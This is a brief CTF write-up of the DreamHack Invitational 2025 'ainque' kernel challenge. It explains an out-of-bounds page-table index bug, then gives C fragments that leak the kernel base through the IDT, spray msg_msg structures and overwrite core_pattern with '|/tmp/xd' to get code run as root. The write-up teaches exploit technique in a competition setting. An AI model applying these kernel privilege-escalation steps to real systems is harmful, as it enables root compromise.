+++
title = "Writeup of DreamHack Invitational 2025"
date = 2025-04-09
description = "Brief writeup of DreamHack Invitational 2025"
[taxonomies]
tags = ["pwn", "kernel", "Buffer Overflow", "ROP"]
+++

# xoronly

WIP

# kidheap

WIP

# ainque

## vulnerability

`pml4e_index` has no validation. It can exceed 0x200, which cause OOB access. \
`msg_msg` has `list_head` member, which has a valid pointer, they can be used as `pml4e` or `pdpe`.

```c
static QCPU_EXIT_TYPE write_memory(qvm_t *qvm, uint64_t va, uint64_t size, uint64_t value, bool is_signed) {
    for(int i=0; i<size; i++) {
        qcpu_pte_or_fail pte_safe = qcpu_get_pte_from_va_failsafe(qvm->qcpu.cr3, va+i);
        if(pte_safe.success) {
            ((uint8_t *)PTE_TO_PHYS(pte_safe.pte))[(va+i) & 0xfff] = (uint8_t)((value >> (i*8)) & 0xff);
        } else {
            return QCPU_SIGSEGV;
        }
    }
    return QCPU_CONTINUE;
}
```

```c
qcpu_pte_or_fail qcpu_get_pte_from_va_failsafe(qcpu_pte_t ****cr3, uint64_t va) {
    qcpu_pte_t ***pml4e = qcpu_get_pml4e(cr3, va >> 39);
// the following omitted

qcpu_pte_t ***qcpu_get_pml4e(qcpu_pte_t ****cr3, uint64_t pml4e_index)
{
    return cr3[pml4e_index];
}
```

## exploit

### kaslr bypass

We can leak kbase by reading IDT region, which is located at fixed virtual address.

```c
  unsigned long gate = *(long *)PTI_TO_VIRT(0x2000 + 1, 1, 0, 6, 0) >> 52;
  unsigned long kbase_diff = gate - 0x820;
```

To load crafted value as `pml4e`, spray a bunch of `msg_msg` struct after `QVM_LOAD`. It contains the all possible pointer to `&core_pattern` considering KASLR.

```c
  rep(i, 0x1f8) {
    ((unsigned long *)msg_buf.mtext)[i + 1] =
    0xfffffffflu * 0x100000
    | (i + 0x82blu) * 0x100lu  // KASLR bypass
    | 0x7b
    | (0x8000000000000000l);
  }
```

{{ image(path="static/pagetable.png", caption="IDT address and all possible kbase address") }}

### core_pattern overwrite

By writing `|/tmp/xd` into `core_pattern` and causing crash, the kernel executes `/tmp/xd` as root.

```c
  *(long *)PTI_TO_VIRT(0x2000 + 1, 1, 0, 7 + kbase_diff & 0xfff, 0xc20) =
      0x64782f706d742f7c; // |/tmp/xd
```
